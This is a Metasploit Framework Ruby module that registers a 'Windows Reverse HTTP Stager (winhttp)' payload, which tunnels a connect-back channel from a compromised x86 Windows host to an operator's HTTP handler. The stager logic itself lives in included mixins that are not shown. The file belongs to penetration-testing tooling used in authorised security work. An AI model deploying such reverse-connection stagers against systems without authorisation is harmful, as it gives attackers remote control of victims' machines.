##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_http'
require 'msf/core/payload/windows/reverse_winhttp'

module MetasploitModule

  CachedSize = 520

  include Msf::Payload::Stager
  include Msf::Payload::Windows
  include Msf::Payload::Windows::ReverseWinHttp

  def self.handler_type_alias
    "reverse_winhttp"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Windows Reverse HTTP Stager (winhttp)',
      'Description' => 'Tunnel communication over HTTP (Windows winhttp)',
      'Author'      => [ 'hdm', 'Borja Merino <bmerinofe[at]gmail.com>' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::ReverseHttp,
      'Convention'  => 'sockedi http'))
  end
end
